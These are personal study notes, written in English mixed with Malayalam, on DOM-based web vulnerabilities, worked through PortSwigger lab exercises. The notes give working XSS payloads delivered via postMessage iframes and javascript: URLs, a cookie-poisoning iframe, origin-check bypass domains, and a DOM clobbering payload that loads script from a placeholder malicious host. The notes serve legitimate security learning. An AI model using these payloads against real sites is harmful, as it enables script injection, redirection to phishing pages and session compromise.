### DOM-based vulnerabilities :
-->DOM-based vulnerabilities arise when a website contains JavaScript that takes an attacker-controllable value, known as a source, and passes it into a dangerous function, known as a sink.
-->**sources** : A source is a JavaScript property that accepts data that is potentially attacker-controlled. An example of a source is the `location.search` property because it reads input from the query string, which is relatively simple for an attacker to control.attacker in control chyan patun eth property um source aan.url,cookie,web messages...
-->**sink** : A sink is a potentially dangerous JavaScript function or DOM object that can cause undesirable effects if attacker-controlled data is passed to it. For example, the `eval()` function is a sink because it processes the argument that is passed to it as JavaScript. An example of an HTML sink is `document.body.innerHTML` because it potentially allows an attacker to inject malicious HTML and execute arbitrary JavaScript.

-->Fundamentally, DOM-based vulnerabilities arise when a website passes data from a source to a sink, which then handles the data in an unsafe way in the context of the client's session.

==============================================================

### #1 Web-Messaging :
-->**Web Messaging** or **cross-document messaging**, is an API allowing documents to communicate with one another across different origins, or source domains
-->==Before the introduction of web messaging the communication of different origins was restricted by the same origin policy and enforced by the browser==
-->athayath rand different aayitulla origins il ninum communications specifically paranjal oru origin il ninum ulla site il ninum athil ulla ethengilum document(kore document elements undallo ath) in mattoru origin il ulla site ile document aayi interaction/communication chyan use chyunathan web messaging
-->html5 in mumb inganane matu platformil ninum vere oru site ilek communicate chyan patilayirunu.This practice barred communication between non-hostile pages as well, making document interaction of any kind difficult
-->Cross-document messaging allows scripts to interact across these boundaries, while providing a rudimentary level of security.
-->Using the Messaging API's `postMessage` method, plain text messages can be sent from one domain to another
-->This requires that the author first obtain the `Window` object of the receiving document(eg nokumbol manasilakum)

-->**ini oru example nokam apo manasilakum** :
-->namuk document A enna oru document inte message example.net enna origin il ninum edukanam.so document A yude origin aan example.net.
-->ini ee document example.com enna document ilek aan ayakendath.document B kkan document A yude message edukendath.so namuk document A yude js code nokam :
             `var o = document.getElementsByTagName('iframe')[0];`
             `o.contentWindow.postMessage('Hello B', 'http://example.com/');`
-->The origin of our `contentWindow` object is passed to `postMessage`. It must match the `origin` of the document we wish to communicate with (in this case, document B)
-->example.com enna origin ilekan document A yumayi communicate chyendath athukondan postMessage il document B yude origin koduthath. ini document B yude js code nokam :

            function receiver(event) {
               if (event.origin == 'http://example.net') {
                     if (event.data == 'Hello B') {
                            event.source.postMessage('Hello A, how are you?', event.origin);
                    }
                    else {
                    alert(event.data);
                    }
                }
            }
            window.addEventListener('message', receiver, false);

-->ivide namal document A yude message receive chyuna code chyunu
-->An event listener is set up to receive messages from document A
-->Using the `origin` property, it then checks that the domain of the sender is the expected domain. Document B then looks at the message, either displaying it to the user, or responding in turn with a message of its own for document A
 -->REFERENCE ->
 1) https://en.wikipedia.org/wiki/Web_Messaging#:~:text=Web%20Messaging%20or%20cross-document%20messaging%2C%20is%20an%20API,disallowed%20cross-site%20scripting%2C%20to%20protect%20against%20security%20attacks.
 2) https://appcheck-ng.com/html5-cross-document-messaging-vulnerabilities

==============================================================

-->==If a page handles incoming web messages in an unsafe way, for example, by not verifying the origin of incoming messages correctly in the event listener, properties and functions that are called by the event listener can potentially become sinks==
-->For example, an attacker could host a malicious `iframe` and use the `postMessage()` method to pass web message data to the vulnerable event listener, which then sends the payload to a sink on the parent page
-->==addEventListener varuna messaginte origin verify chyunilengil ath oru vulnerability aan.namuk oru fake site iframe vazhi use chyth `contentWindow.postMessage('print()','*')` ee reethiyil postMessage method koduth namuk venda karyam execute chyam==

### addEventListener :
-->addEventListener eg ->
                        
                        element.addEventListener("click", myFunction);  
                        function myFunction() {  
                                   document.getElementById("demo").innerHTML = "Hello World";  
                        }
-->ivide event click um , muFunction ennath listen chyunath allengil reference um aan
-->so click enna event nadalumbol demo enna element js edukum enit athinte html il hello world enna string append chyum.ingane pala events um und ath

==============================================================

            Lab-1(DOM XSS using web messages)
-->namal lab il keruka.enit home page il inspect element chyumbol body html tag inte ullil kanam  :

          <div id='ads'>
                    </div>
                    <script>
                        window.addEventListener('message', function(e) {
                            document.getElementById('ads').innerHTML = e.data;
                        })
                    </script>

-->ivide nokiyal kanam addEventListeren il message event aayi und pine function aan .allathe aa message inte origin verfy chyun code illa(ee funciton nte ullil thane aayiriukum verfy chyuna code undavuka enn thonunu)
-->so namuk oru iframe undaki athil ee site inte page correct path src koduth onload enna attribute il postMessage enna method il namuk venda message kodukam.enit ee iframe load aakumbol namude target site il ninulla event handler ath accept chyum
-->**PAYLOAD**->
`<iframe src="https://0a55004d038cf950c0180ea20051009c.web-security-academy.net/" onload="this.contentWindow.postMessage('<img src=1 onerror=print()>','*')">`

-->The event listener, which is intended to serve ads (ads enna id aan jf getEle...vech edukuanth), takes the content of the web message and inserts it into the `div` with the ID `ads`
-->However, in this case it inserts our `img` tag, which contains an invalid `src` attribute. This throws an error, which causes the `onerror` event handler to execute our payload.
-->==As the event listener does not verify the origin of the message, and the `postMessage()` method specifies the `targetOrigin` `"*"`, the event listener accepts the payload and passes it into a sink, in this case, the `eval()` function.==

==============================================================

        Lab-2(DOM XSS using web messages and a JavaScript URL)
-->ividem nama home page il inspect element chyunu.apol oru script kanam :
         <script>
                        window.addEventListener('message', function(e) {
                            var url = e.data;
                            if (url.indexOf('http:') > -1 || url.indexOf('https:') > -1) {
                                location.href = url;
                            }
                        }, false);
                    </script>
-->Notice that the home page contains an `addEventListener()` call that listens for a web message
-->JavaScript contains a flawed `indexOf()` check that looks for the strings `"http:"` or `"https:"` anywhere within the web message
-->It also contains the sink `location.href`. athyath ee source ilekan message/data append chyuka
-->ivide check chyunath engane enal message il https/http index il undengil mathrame accept chyu
-->so namuk payload undakam :
     `<iframe src="https://your-lab-id.web-security-academy.net/" onload="this.contentWindow.postMessage('javascript:print()//http:','*')">`
-->so namal ivide namaml iframe il postMessage method il namal namuk venda message kodukunu ennit double slash itt http kodukunu apol http undenn ullath check um chyunu ennal print function execute um chyunu
-->ivide namal note chyuka function il http/https undo enn check chyunathe ullo allathe origin check chyunila athukond `*` enn http kk shesham kodukunu

==============================================================

### eval() :
-->javascript has many build in function.one of them is eval() . eval basically means evaluate. to evaluate a function or expression
-->enthengilum oru karya correct aano enn double check chyanoke aan eval() fn use chyuka

==============================================================

### Origin Verification :
-->origin verify chyuna oru code nokam :

            window.addEventListener('message', function(e) {
                      if (e.origin.indexOf('normal-website.com') > -1) { 
                                    eval(e.data); 
                                    } 
            });

-->ivide namuk kanam origin check chyunund js.pakshe ithinum problem und origin il evidengilum normal-website.com enna string undo ennu mathrame check chyuu
-->so oru attacker il ith bypass chyam `http://www.normal-website.com.evil.net`
enn kodukumbol js ee string check chyum but namuk venda origin kodukukayum chyam
-->The same flaw also applies to verification checks that rely on the `startsWith()` or `endsWith()` methods. For example :

	        window.addEventListener('message', function(e) {
                    if (e.origin.endsWith('normal-website.com')) { 
                          eval(e.data); 
                          } 
	        });
-->the following event listener would regard the origin `http://www.malicious-websitenormal-website.com` as safe.

==============================================================

              Lab-3(DOM XSS using web messages and JSON.parse)
-->ividem namal home page il view-source adikuka apol js code kanam :

        <script>
            window.addEventListener('message', function(e) {
                            var iframe = document.createElement('iframe'), ACMEplayer = 
                                                    {element: iframe}, d;
                            document.body.appendChild(iframe);
                            try {
                                d = JSON.parse(e.data);             --1)
                            } catch(e) {
                                return;
                            }
                            switch(d.type) {
                                case "page-load":
                                    ACMEplayer.element.scrollIntoView();
                                    break;
                                case "load-channel":
                                    ACMEplayer.element.src = d.url;
                                    break;
                                case "player-height-changed":
                                    ACMEplayer.element.style.width = d.width + "px";
                                    ACMEplayer.element.style.height = d.height + "px";
                                    break;
                            }
                }, false);
        </script>

-->This event listener expects a string that is parsed using `JSON.parse()`  -1) nok.
-->When the `iframe` we constructed loads, the `postMessage()` method sends a web message to the home page with the type `load-channel`
-->The event listener receives the message and parses it using `JSON.parse()` before sending it to the `switch`.
-->ivide ulla switch il load-channel enna case aan trigger aakuka,which assigns the `url` property of the message to the `src` attribute of the `ACMEplayer.element` `iframe`. so ee sthalathan namuk venda javascript payload kodukam like xss
-->ividem evenListerner origin check chyunila
-->**PAYLOAD** :
          `<iframe src=https://your-lab-id.web-security-academy.net/ onload='this.contentWindow.postMessage("{\"type\":\"load-channel\",\"url\":\"javascript:print()\"}","*")'>`

-->ith entho regex oke use chyunathanen thonunu manasilakunila

==============================================================

### #2 Dom-based Open-Redirection
-->DOM-based open-redirection vulnerabilities arise when a script writes attacker-controllable data into a sink that can trigger cross-domain navigation

             let url = /https?:\/\/.+/.exec(location.hash); 
             if (url) {
                  location = url[0]; 
              }
-->this code is vulnerable due to the unsafe way it handles the `location.hash` property
-->An attacker may be able to use this vulnerability to construct a URL that, if visited by another user, will cause a redirection to an arbitrary external domain.
-->ee dom-based open redirection nte oru prathyekatha enthennal ith phishing attack aayi use chyumbol site inte credibility ye chodyam cheyunapole aan work chyuka.karanam.browser il https , tls naked eye il kanan patuna reethiyil ulla oru kozhapavum undavila so eth user aanengilum ith real website thane aan enn viswasikum

            Lab-4(DOM-based open redirection)
-->ivide namal lab il keruka enit athile ethengilum blog post il keruka apol aa page il kanam back to blog enn.
-->so athil click chyumbol namal back ilek pokum.so view-source adikuka apol namuk thazhe aayit kanam
-->so athil inspect element adikuka apol ee code kanam :
           <a href='#' onclick='returnUrl = /url=(https?:\/\/.+)/.exec(location); if(returnUrl)location.href = returnUrl[1];else location.href = "/"'>Back to Blog</a>
-->so ivide href il value # aan.ithil namuk venda value/url kodukam
-->ivide nokiyal kanam /url =(ht..  so url ennath oru parameter aakam
-->so aa blog post inte page ile url ...?id=2 ennan ullath so athil namal puthiya parameter add chyth vere oru malicious url kodukam
-->ie, ...?id=2&url=malicious.com
-->javascript il location.something ulla js code iloke dom-based open redirection undakan chance und

==============================================================

### #3 DOM-based cookie manipulation :
-->Some DOM-based vulnerabilities allow attackers to manipulate data that they do not typically control such as cookies

              Lab-5(DOM-based cookie manipulation)
-->ivide namal oru product ilek pokuka enit back adikuka apol home page il puthiya ou button kanam->Last viewed product
-->ithoru client side cookie aan.so athinte value ennath ->https://0a22003503f7df11c0a97de100020020.web-security-academy.net/product?productId=1 . so namuk athin shesham xss polulla payload try chyam
-->`<iframe src="https://your-lab-id.web-security-academy.net/product?productId=1&'><script>print()</script>" onload="if(!window.x)this.src='https://your-lab-id.web-security-academy.net';window.x=1;">`
-->The `onload` event handler ensures that the victim is then immediately redirected to the home page, unaware that this manipulation ever took place. While the victim's browser has the poisoned cookie saved, loading the home page will cause the payload to execute.

==============================================================

### #4 DOM Clobbering :
-->dom clobbering is a technique used to inject html on to the client side
-->athayath dom manipulate chythit javascript inte normal behaviour change chyuka athan udheshikunath

**CONDITIONS** :
1) insert html with 'id' or 'name' attributes. ie, if you have controll over html and you can inert id or name attribute then dom clobbering is possible
2) there should be a global variable or property of an object (usrally 'window').athayath aa html/script il window. something enn undakanam.eg:namal oru website il javascript code il avatar fetch chyuna code und ath window.defaultavatar enna gloabal variable il ninum fetch chyunu.so ivide global variable use chyunu.athan namuk vendath

**EXAMPLE NOKAM** :
-->window.onload ennal ath oru event hadler aan athaytah window load aakumbol athil enthano ullath ath execute aakum

            <script> 
                       window.onload = function(){
                             let someObject = window.someObject || {};
                              let script = document.createElement('script');
                               script.src = someObject.url;
                                document.body.appendChild(script); 
                        };
                </script>
-->so ivide window load aakumbol ee function execute aakunu.ivide window.someobject ile someobject aan id.
-->rand conditions meet chyan patiyale dom clobbering nadaku enna njan paranju so ivide namuk insert chyan ulla id kity ie,someobject, athupole thane namuk use chyan ulla global variablum kity ie,window.someobject
-->so payload : `<a id=someObject><a id=someObject name=url href=//malicious-website.com/evil.js>` ingane varum.
-->**REFERENCE** : https://research.securitum.com/xss-in-amp4email-dom-clobbering/
-->inspect->console il poi window. ennadichal namuk kanam windows. il enthoke unden.ithil athikavum defualt aaya eventhandlers aayirikum.athonum overwrite chyan patila.like onload , blur , onclick... but ithallathe vere undakum default allathath ath developers idunath.so athan namal overwrite chyth dom clobbering chyunath



### Prevention :
-->the most effective way to avoid DOM-based vulnerabilities is to avoid allowing data from any untrusted source to dynamically alter the value that is transmitted to any sink.
-->If the desired functionality of the application means that this behavior is unavoidable, then defenses must be implemented within the client-side code